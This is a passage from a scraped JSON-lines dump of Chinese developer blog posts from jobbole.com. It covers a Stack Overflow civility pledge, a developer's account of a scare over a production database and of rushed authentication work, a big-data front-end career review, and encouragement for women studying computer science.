的表现像个混蛋，但是大多数人不会这样</h3>\n<p>我当然不会宣称 Stack Overflow 社区是完美的。我看到过一些用户对提出低质量问题的人非常无理，我不是要为此进行申辩。如果你看我非常不礼貌，那么请阻止我。我不认为要求改进问题本身是粗鲁的，我们可以非常礼貌地要求改进问题，也可以非常刻薄地要求改进问题。我完全赞成提高 Stack Overflow 的文明水平，但是我认为这不能以牺牲网站质量为代价。</p>\n<p>我还经历过要求提问者提供更多信息时，提问者的反应非常无理的情况。这不是一个单向的问题。在这个方向上，我看到过比回答者更加粗鲁的行为。事实上，这些问题通常被关闭或删除，所以只是随便浏览网站的人通常不会看到这些。</p>\n<p>我的时间非常有限，所以我们来看最重要的一点，我们需要对彼此更友好。</p>\n<h3>Jon 的 Stack Overflow 宣誓</h3>\n<p>我故意把它称为<em>我的</em>宣誓，因为这不是将我的要求强加于他人的地方。如果你认为这也是你想遵循的原则（或许有一些修正），那再好不过了。如果 Stack Overflow 决定在网站指南的某个地方采用它，我非常欢迎，并且他们可以对其做任何适当的修改。</p>\n<p>从本质上来讲，我认为许多问题看起来像是提问者和回答者之间的一种交易。因此，建立一种契约是合理的（虽然这听起来更像是商业用语），因此，我倾向于使用一个诚心的宣誓。</p>\n<p><strong>作为一个回答者，我将…</strong></p>\n<ul>\n<li>不表现的像个混蛋。</li>\n<li>记住我正在回应的是人，是有感情的。</li>\n<li>认定我正在回应的人是诚心地希望得到帮助。</li>\n<li>要明确，对问题质量的评论不是对提问者的价值的指责。</li>\n<li>记住，有些时候，我正在回应的人可能会感到他们正在被指责，即使我不认为我有这个意思。</li>\n<li>要明确，评论如何改善问题时提出积极的具体建议，不要消极地强调现状。</li>\n<li>答案要清楚，记住不是每个人都与我的技术背景相同（所以有些术语可能需要链接等)。</li>\n<li>花点时间好好展示我的答案，使用尽可能易读的格式。</li>\n</ul>\n<p><strong>作为一个提问者，我将… </strong></p>\n<ul>\n<li>不表现的像个混蛋。</li>\n<li>记住任何一个回答问题的都是人类，都是有感情的。</li>\n<li>认定任何一个回答我问题的人都充满善意并试图帮助我。</li>\n<li>记住我是在要求其他人放弃自己的时间来帮助我解决问题。</li>\n<li>在提问之前先研究自己的问题、尽可能的缩小问题范围、给出尽可能详细的相关信息来减少回答问题的人需要花费的时间。</li>\n<li>花点时间好好提出自己的问题，使用尽可能易读的格式。</li>\n</ul>\n<p>我希望大部分时间我可以遵循这些誓言。我怀疑自己有时候做不到，所有希望通过明确的写出来，阅读它，使自己成为一个更好的社区成员。</p>\n<p>我认为如果每个人在 Stack Overflow 上发布任何内容之前都遵循这样的誓言，我们的社区将会更加美好。</p>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我翻译更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏译者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我翻译更多好文章，谢谢！</h4>\n                <p>任选一种支付方式</p>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2016/10/11eefac5bf4ae36c73b7b40eb087be7b.jpg\">\n            \n                            <img src=\"http://jbcdn2.b0.upaiyun.com/2016/10/02a9f7817f8dd0012ff1327fde5bdc94.jpg\">\n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114166\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114166votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114166\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/wx232824506\">学以致用123</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/wx232824506\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2015/04/8fbdaaa5ea6d3b49c8c1c825aafeb5d9.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            应用软件开发，主要用python、sql        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/wx232824506\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/wx232824506/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/wx232824506/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 21</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>"], "tags": "其他,StackOverflow", "author": "伯乐在线", "front_image_path": "full/217248f366b3ffdce01fd5df8546529db6cbed0f.jpg"}
{"title": "我作为开发者犯过的两次愚蠢的错误", "createdate": "2018/06/29", "url": "http://blog.jobbole.com/114164/", "url_object_id": "6ef1af433054de7bb42416cdfc0fbfd8", "front_image_url": ["http://wx3.sinaimg.cn/mw690/7cc829d3gy1fsrtjp2o93j20hs0audih.jpg"], "thumbs": 1, "bookmark": null, "comments": null, "contents": ["<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/dimple11\">dimple11</a> 翻译，<a href=\"http://www.jobbole.com/members/liuchang\">刘唱</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://medium.freecodecamp.org/the-times-ive-messed-up-as-a-developer-3c0bcaa1afd6\">Zachary Kuhn</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>上周我和同事们简单地聊了聊我们工作中搞砸的那些事儿。如今早已不再犯那些错了，所以想起过去就觉得很好笑。但是笑归笑，其实当时犯的这些错让我们受益颇深。</p>\n<p><img class=\"alignnone aligncenter\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fsrtjp2o93j20hs0audih.jpg\" width=\"640\" height=\"390\"></p>\n<p style=\"text-align: center;\">（credit：Snecx）</p>\n<p>分享自己犯错的经历至关重要，能让别人从中吸取经验教训，而且可能让他们工作起来更上手。我在这儿记录了几条自己最近犯的错。</p>\n<h3>为什么有那么多生产数据库被误删？</h3>\n<p>几个月之前，Reddit 上发了一篇<a href=\"https://www.reddit.com/r/cscareerquestions/comments/6ez8ag/accidentally_destroyed_production_database_on/\">文章</a>，写的是一个入门级开发人员在上班第一天就误删了生产数据库。我们看到类似这种有人犯了特大的、不可磨灭的错误的文章，都不免心生畏惧。我们意识到自己并不是没可能犯那种错——大多数时候都是悬崖勒马。</p>\n<p>我在干第一份工作的时候，有一个高级数据库管理员在上班第一天就误删了生产数据库，这种例子简直比比皆是。工作团队用一周前旧的数据库备份帮他弥补了过失，让他保住了工作。如今十年过去了，都仍用这件事拿他开涮。</p>\n<p>今年年初有天早上，我被叫去调查一个客户生产中出现的问题。他们本来要针对一小部分用户进行产品的 β 测试，但是他们的网站首页突然什么都显示不出来了。我猜想可能是系统有 bug 或者有漏洞所致。</p>\n<p>我登录进生产机器，调出数据库，发现 articles 表是空的。OK，这证实了网页显示空白的情况。</p>\n<p>用户表里面还是有用户的，这就奇怪了，所以我们丢了所有的 articles，但起码他们的测试用户仍有他们的账号，我们可以解释说是这是个测试版，而且这种事情时有发生。</p>\n<p>接下来一会儿我就犯迷糊了。我记不清楚自己干了什么，我认为自己不会蠢到在控制台窗口输入了删除表中用户的指令，可情况就是这样——现在既没有 articles 表，也没有用户表。我呆坐着，感觉有点震惊。</p>\n<p>然后我的大脑高速运转，开始想办法修复问题。我真的删掉用户表了吗？是的。我们运行备份数据库了吗？没有。该怎么向客户解释呢？我不知道。</p>\n<p>我记得自己去找了项目经理，坐在她旁边解释事情发生的经过，articles 表中没有数据了，所以网站看上去是空的。哦对了，我还误删了用户表。现在他们需要重新邀请所有的用户——如果他们还能想清楚用户都有谁的话。哎呀。</p>\n<p>我回到自己的座位上，感觉深受挫败。</p>\n<p><strong>但是我觉得事情有些蹊跷，我们怎么可能一开始就丢了所有的 articles 表呢？</strong>于是我继续深究下去，一方面是因为难以接受这个结果，一方面是想挽回颜面。之后过了一小会儿，我注意到了关键问题。</p>\n<p>服务器上还有另外 5 个数据库，其中一个的名字和我正在看的那个数据库的名字非常相似。</p>\n<p>我一检查，发现 articles 都在里面，用户表也完好无损。事实证明是因为配置发生变化，无意间让它变成了生产数据库，导致网站指向了全新的数据库。我在里面看到的那些用户呢？种子数据罢了。</p>\n<p>真是如释重负！一早上神经紧绷、胃酸翻涌，搞得我浑身不适，但好在我们“修复”了所有的数据，并且找到了问题真正的症结所在，没有提前宣布误删数据库的坏消息。</p>\n<p>这个小插曲让我们受益良多，最简单的一个就是：现在我们总是在给数据库做备份……这可能是我们开发人员最有效的胃药。</p>\n<h3>总赶进度，却从来赶不上进度</h3>\n<p>我最近所犯的另一个突出 错误没那么戏剧化，实际上是由一个个小错误最终累积造成了大麻烦。</p>\n<p>我们项目开发的一大挑战就是时间紧张（但也不全是？）</p>\n<p>第一次开会时，我们一致觉得项目需要的时间比我们能够拿出来的时间多了一倍。从项目一开始，截止日期就步步紧逼，所以我们三下五除二就通过了认证环节，以便进入客户真正关心的功能环节。</p>\n<p>我只是之前在一个单页 app 中落实了一次认证，但仍然没有彻底理解 app 各部分是如何协调的。</p>\n<p>尽己所能用最快的速度把 app 赶出来，就是大错特错，<strong>我漏掉了一些非常重要的东西：</strong></p>\n<ol>\n<li>用户在登陆后，是通过 cookie 来加载的，但是我的 app 页面没有给加载提供等待时间，而是根据事件顺序来决定先后的，所以服务器会回复说你没有权限。这种错误很少见，而且很难再出现，因为大多数情况下事件都是按照正确的顺序来完成的。</li>\n<li>而且认证环节也从不检查用户令牌是否失效，如果你不经常访问网站，当发现了没法登上网站后，就需要注销登录再重新登进去。</li>\n<li>令牌应该在每次发起请求时都进行更新，但我从来都没有时间去理解这些规则。所以这里又产生了时间问题。如果我们一次同时发出几种请求，收到的回复取决于他们到来的顺序，那将来发送请求用到的令牌就是错的。</li>\n</ol>\n<p>我们卯足劲赶进度，但最终所用的时间还是要比给定的时间多一倍。区别就是我们开发出的 app 里面漏洞更多了，然后甚而要花更多的时间对漏洞进行追踪和修复。</p>\n<p>工作中的失误让我尴尬不已，在大家面前感到十分羞愧，因为我把一切都搞砸了。</p>\n<p>我要说一点：从那之后，我开始花时间学习认证机制，现在已经理解了 OAuth,、JWT、刷新令牌和失效。我仔细阅读了许多库里别人写的认证代码，而且建立了基于几种不同语言版本和框架的认证流程。</p>\n<h3>失败是成功之母</h3>\n<p>这是每次失败的经历给予我的启发。只要你愿意学习，几乎每次这样的经历都会让你从中受益。</p>\n<p>如果人能够从错误中吸取教训，那么就会有所进步。如果一个队员是第一次犯错，我尽量不会对他表现出不满态度，他们往往已经知道自己把事情搞糟了。</p>\n<p>但我也努力不去苛责那些总是犯错、屡教不改的人，他们也需要被同情。</p>\n<p>对待犯错，如果你能够做到这四点，那么就会不断进步：</p>\n<ul>\n<li>对曾经犯过的错误可以自嘲一番</li>\n<li>从中吸取经验教训</li>\n<li>在之后努力为自己正名</li>\n<li>和他人分享，让他人也能从中获益。</li>\n</ul>\n<p>关于犯错的宝贵价值，我留给你们一则名人轶事：20 世纪初期，IBM 的总裁托马斯·J·沃森遇到了一位因为多次决策错误让公司损失惨重的员工，当问及是否要开除这个员工时，沃森答道：</p>\n<blockquote><p>“不，我刚刚花了 60 万美元培训了他，我怎么会让其他人雇佣他来获得他的经历呢？”</p></blockquote>\n<p>你过去犯过哪些有意思的错？来一起分享吧！</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114164\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114164votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114164\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/dimple11\">dimple11</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/dimple11\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2017/09/28db3e36f17643a752be4b798d5ceabc.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/dimple11\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/dimple11/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/dimple11/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 15</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>"], "tags": "职场,程序员,职场", "author": "伯乐在线", "front_image_path": "full/2429e83a2e9ae3455ad465bd664afe485a339128.jpg"}
{"title": "这两年在大数据行业中的工作总结", "createdate": "2018/07/01", "url": "http://blog.jobbole.com/114185/", "url_object_id": "d2a28d4e4a9004a7b3c4643177084415", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/07/cecb3d3562d80f7f904e989de853d49d.png"], "thumbs": 1, "bookmark": 1, "comments": null, "contents": ["<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/ztfjs/p/bigdata.html\">张泰峰</a>   </div><h2 id=\"w1\">写在前面</h2>\n<p>今年广州的六月，在经历了大雨的洗礼之后，一切都变得更加明朗起来，新的工作，新的人和事。懒惰让我变得更焦虑，焦虑促使我进步，程序员的焦虑大家应该都有共同的感觉，时代的步伐太快了，在这个环境下的软件开发一定会淘汰掉那些不懂得学习，懒惰的人。</p>\n<p>希望跟大家共勉。</p>\n<p>今天呢，博主主要回顾这两年来，在大数据行业公司从事大数据类的前端开发的工作。最近刚刚换了一份工作，把我的经验稍作总结分享给大家，有什么建议大家在评论区踊跃。 谢谢。</p>\n<p>今天的主题，主要是从大数据开发的角度，到大数据治理的必要性，再到图形化建模的畅想，最后在数据质量的把关，然后到大数据可视化的应用，博主总结两年的见闻，和我学习的成果，也不知理解有无偏差吧，希望大家能给出建议。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/cecb3d3562d80f7f904e989de853d49d.png\" alt=\"\"></p>\n<h2 id=\"w1\">大数据开发</h2>\n<p>大数据开发，有几个阶段：</p>\n<p>1.数据采集【原始数据】</p>\n<p>2.数据汇聚【经过清洗合并的可用数据】</p>\n<p>3.数据转换和映射【经过分类，提取的专项主题数据】</p>\n<p>4.数据应用 【提供api 智能系统  应用系统等】</p>\n<p><strong>数据采集</strong></p>\n<p>数据采集有线上和线下两种方式，线上一般通过爬虫、通过抓取，或者通过已有应用系统的采集，在这个阶段，我们可以做一个大数据采集平台，依托自动爬虫（使用python或者nodejs制作爬虫软件），ETL工具、或者自定义的抽取转换引擎，从文件中、数据库中、网页中专项爬取数据，如果这一步通过自动化系统来做的话，可以很方便的管理所有的原始数据，并且从数据的开始对数据进行标签采集，可以规范开发人员的工作。并且目标数据源可以更方便的管理。</p>\n<p>数据采集的难点在于多数据源，例如mysql、postgresql、sqlserver 、 mongodb 、sqllite。还有本地文件、excel统计文档、甚至是doc文件。如何将他们规整的、有方案的整理进我们的大数据流程中也是必不可缺的一环。</p>\n<p><strong>数据汇聚</strong></p>\n<p>数据的汇聚是大数据流程最关键的一步，你可以在这里加上数据标准化，你也可以在这里做数据清洗，数据合并，还可以在这一步将数据存档，将确认可用的数据经过可监控的流程进行整理归类，这里产出的所有数据就是整个公司的数据资产了，到了一定的量就是一笔固定资产。</p>\n<p>数据汇聚的难点在于如何标准化数据，例如表名标准化，表的标签分类，表的用途，数据的量，是否有数据增量？，数据是否可用？ 需要在业务上下很大的功夫，必要时还要引入智能化处理，例如根据内容训练结果自动打标签，自动分配推荐表名、表字段名等。还有如何从原始数据中导入数据等。</p>\n<p><strong>数据转换和映射</strong></p>\n<p>经过数据汇聚的数据资产如何提供给具体的使用方使用？在这一步，主要就是考虑数据如何应用，如何将两个？三个？数据表转换成一张能够提供服务的数据。然后定期更新增量。</p>\n<p>经过前面的那几步，在这一步难点并不太多了，如何转换数据与如何清洗数据、标准数据无二，将两个字段的值转换成一个字段，或者根据多个可用表统计出一张图表数据等等。</p>\n<p><strong>数据应用</strong></p>\n<p>数据的应用方式很多，有对外的、有对内的，如果拥有了前期的大量数据资产，通过restful API提供给用户？或者提供流式引擎 KAFKA 给应用消费? 或者直接组成专题数据，供自己的应用查询？这里对数据资产的要求比较高，所以前期的工作做好了，这里的自由度很高。</p>\n<p><strong>总结：大数据开发的难点</strong></p>\n<p>大数据开发的难点主要是监控，怎么样规划开发人员的工作？开发人员随随便便采集了一堆垃圾数据，并且直连数据库。 短期来看，这些问题比较小，可以矫正。 但是在资产的量不断增加的时候，这就是一颗定时炸弹，随时会引爆，然后引发一系列对数据资产的影响，例如数据混乱带来的就是数据资产的价值下降，客户信任度变低。</p>\n<p>如何监控开发人员的开发流程？</p>\n<p>答案只能是自动化平台，只有自动化平台能够做到让开发人员感到舒心的同时，接受新的事务，抛弃手动时代。</p>\n<p>这就是前端开发工程师在大数据行业中所占有的优势点，如何制作交互良好的可视化操作界面？如何将现有的工作流程、工作需求变成一个个的可视化操作界面？ 可不可以使用智能化取代一些无脑的操作？</p>\n<p>从一定意义上来说，大数据开发中，我个人认为前端开发工程师占据着更重要的位置，仅次于大数据开发工程师。至于后台开发，系统开发是第三位的。好的交互至关重要，如何转换数据，如何抽取数据，一定程度上，都是有先人踩过的坑，例如kettle，再例如kafka，pipeline ，解决方案众多。关键是如何交互？ 怎么样变现为可视化界面？ 这是一个重要的课题。</p>\n<p>现有的各位朋友的侧重点不同，认为前端的角色都是可有可无，我觉得是错误的，后台的确很重要，但是后台的解决方案多。 前端实际的地位更重要，但是基本无开源的解决方案，如果不够重视前端开发， 面临的问题就是交互很烂，界面烂，体验差，导致开发人员的排斥，而可视化这块的知识点众多，对开发人员的素质要求更高。</p>\n<h2 id=\"w1\">大数据治理</h2>\n<p>大数据治理应该贯穿整个大数据开发流程，它有扮演着重要的角色，浅略的介绍几点：</p>\n<p>数据血缘</p>\n<p>数据质量审查</p>\n<p>全平台监控</p>\n<p><strong>数据血缘</strong></p>\n<p>从数据血缘说起，数据血缘应该是大数据治理的入口，通过一张表，能够清晰看见它的来龙去脉，字段的拆分，清洗过程，表的流转，数据的量的变化，都应该从数据血缘出发，我个人认为，大数据治理整个的目标就是这个数据血缘，从数据血缘能够有监控全局的能力。<strong><br>\n</strong></p>\n<p>数据血缘是依托于大数据开发过程的，它包围着整个大数据开发过程，每一步开发的历史，数据导入的历史，都应该有相应的记录，数据血缘在数据资产有一定规模时，基本必不可少。</p>\n<p><strong>数据质量审查</strong></p>\n<p>数据开发中，每一个模型（表）创建的结束，都应该有一个数据质量审查的过程，在体系大的环境中，还应该在关键步骤添加审批，例如在数据转换和映射这一步，涉及到客户的数据提供，应该建立一个完善的数据质量审查制度，帮助企业第一时间发现数据存在的问题，在数据发生问题时也能第一时间看到问题的所在，并从根源解决问题，而不是盲目的通过连接数据库一遍一遍的查询sql。</p>\n<p><strong>全平台监控</strong></p>\n<p>监控呢，其实包含了很多的点，例如应用监控，数据监控，预警系统，工单系统等，对我们接管的每个数据源、数据表都需要做到实时监控，一旦发生殆机，或者发生停电，能够第一时间电话或者短信通知到具体负责人，这里可以借鉴一些自动化运维平台的经验的，监控约等于运维，好的监控提供的数据资产的保护也是很重要的。</p>\n<h2 id=\"w1\"></h2>\n<h2 id=\"w1\">大数据可视化</h2>\n<p>大数据可视化不仅仅是图表的展现，大数据可视化不仅仅是图表的展现，大数据可视化不仅仅是图表的展现，重要的事说三遍，大数据可视化归类的数据开发中，有一部分属于应用类，有一部分属于开发类。</p>\n<p>在开发中，大数据可视化扮演的是可视化操作的角色， 如何通过可视化的模式建立模型？ 如何通过拖拉拽，或者立体操作来实现数据质量的可操作性？ 画两个表格加几个按钮实现复杂的操作流程是不现实的。</p>\n<p>在可视化应用中，更多的也有如何转换数据，如何展示数据，图表是其中的一部分，平时更多的工作还是对数据的分析，怎么样更直观的表达数据？这需要对数据有深刻的理解，对业务有深刻的理解，才能做出合适的可视化应用。</p>\n<p><strong>智能的可视化平台</strong></p>\n<p>可视化是可以被再可视化的，例如superset，通过操作sql实现图表，有一些产品甚至能做到根据数据的内容智能分类，推荐图表类型，实时的进行可视化开发，这样的功能才是可视化现有的发展方向，我们需要大量的可视化内容来对公司发生产出，例如服装行业，销售部门：进货出货，颜色搭配对用户的影响，季节对选择的影响   生产部门：布料价格走势？  产能和效率的数据统计？  等等，每一个部门都可以有一个数据大屏，可以通过平台任意规划自己的大屏，所有人每天能够关注到自己的领域动向，这才是大数据可视化应用的具体意义。</p>\n<h2 id=\"w1\">写在最后</h2>\n<p>洋洋洒洒写了很多，对我近两年的所见所闻所学所想进行了一些总结，有些童鞋会问，不是技术么？为什么没有代码？   博主要说，代码博主要学的，要写的，但是与工作无关，代码是我个人的技能，个人傍身，实现个人想法的重要技能。 但是，代码与业务的关系不大，在工作中，懂业务的人代码写的更好，因为他知道公司想要什么。 如果你业务很差，那也没关系，你代码好就行了呀，根据别人的交代干活，也是很不错的。技术和业务是相辅相成的，稍后博主总结代码的精进。</p>\n<p>写完了，博主的焦虑一丝未少，我的代码规范性不够，目前技术栈js、java、nodejs、python 。</p>\n<p>主业js熟练度80%吧，正在研究阮一峰的es6（看的差不多）和vuejs的源码（有点搁浅），vuejs算是中等，css和布局方面可以说还可以，另外d3.js，go.js都是处于会用，能干活。 nodejs呢，express和koa无问题，看过一些express的源代码，还写过两个中间件。</p>\n<p>java、python都处于能做项目的程度，目前也不想抽很多精力去深入它们，就想要保持在想用能用的地步吧。</p>\n<p>未来的几年，博主努力工作，多学学人工智能、大数据开发的知识，未来这块应该还有一些热度的吧。</p>\n<p>最后，和大家共勉，更希望大家能给一些规划建议，三人行，必有我师焉。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114185\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114185votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114185\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>"], "tags": "职场,大数据", "author": "张泰峰", "front_image_path": "full/69c52b7ee4a3c96048e034a1f1868b3b4be72871.jpg"}
{"title": "计算机专业太难不适合女生学？来看 N 多小姐姐的回应", "createdate": "2018/06/22", "url": "http://blog.jobbole.com/114141/", "url_object_id": "a994858569521b3cc4c7ef650140ad3c", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/cebf98169b4fd1e38a35c3537129ceaa.jpg"], "thumbs": 1, "bookmark": 1, "comments": 3, "contents": ["<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/aoi\">伯小乐</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><p>高考结束了，填志愿选专业的时候也要来了。最近我们微博收到一个私信求助：</p>\n<p><img class=\"alignnone\" src=\"https://wx2.sinaimg.cn/mw690/7cc829d3gy1fsj78ysbugj20f9051gmi.jpg\" width=\"549\" height=\"181\"></p>\n<blockquote><p><a href=\"https://weibo.com/2093492691/GmruxxXrK\" target=\"_blank\">https://weibo.com/2093492691/GmruxxXrK</a></p></blockquote>\n<p>在<a href=\"http://www.jobbole.com/members/weibo_2093492691\">@程序员的那些事</a> 微博发布后，有位小姐姐还感叹：</p>\n<blockquote><p>@刘不刘二小姐：没想到“计算机太难不适合女生学”的观点五年前我上大学的时候有，现在都火成这样了还有[二哈]</p></blockquote>\n<p>很多关注我们的小姐姐都冒泡留言，鼓励那位求助的女生。汇总如下：</p>\n<blockquote><p>@澈海情深：计算机女生出来说一句，现在干啥都挺难的。学计算机也没有想象中那么恐怖。感兴趣就学呗。</p>\n<p>@眠眠阿卷：选吧，学计算机又不是以后当码农，计算机是个工具，你学了计算机，以后去哪里再读其他专业都受欢迎</p>\n<p>@J家蠢萌痴汉夏：怎么会，我就毕业了呀，毕业还是简单的，只要好好听课，也不会挂科的[二哈] 当年高考结束填志愿，五个全是计算机第一顺位，🙊回过头想想也是有勇气啊</p>\n<p>@凃小斐：老子就是女孩子，毕业的时候专业第一的成绩保送985研究生，谁跟你说女孩子不适合学计算机的出来我打死他</p>\n<p>@于梦杰呀：计算机系女生表示难确实是难，有时还会感觉痛苦，但是只要你好好学肯定是能学好的</p>\n<p>@enchantereyes：喜欢就选。首先再菜毕业也不会难，另外学一行跟干一行是两码事。难得有想学的东西，不试试不会不甘心吗？</p>\n<p>@geekInfo：我也是计算机出来的女生。最初的专业是应用数学选修经济，学了一学期不开心反而喜欢计算机课就转了专业。读大学之前一点编程基础也没有，也不就这么顺利研究生毕业了。毕业成绩年级第二，文凭还没到手就被公司定下来了，到现在一直很喜欢这职业，庆幸当初转了专业，要学自己感兴趣的。</p>\n<p>@月光少爷金：时代不一样了，女程序猿不知道多受欢迎。况且，不学计算机，学统计将来做策略也不错呀</p>\n<p>@芒果很忙busybusy：学吧，入门没有想象中那么难的，我就是程序媛，IT公司女生少，环境相对比较单纯，是非也少，女生挺受宠的</p>\n<p>@茶杯茶茶茶：计算机有脑子的都能学，很好学的，相比于其他的专业，至少很多东西可以直接上手及时反馈，网上教程一大堆，只有计算机方面的可以。</p>\n<p>@翡翠梦境里睡觉的猫：有兴趣就可以选，当年报志愿之前也有人再三强调学计算机累（倒是没说女生不适合，现在想来在当时已经难得），然而我高中学了一点编程觉得有趣，于是选了，于是一路计算机好多年仍然觉得很有趣</p></blockquote>\n<p>其他几个男生的留言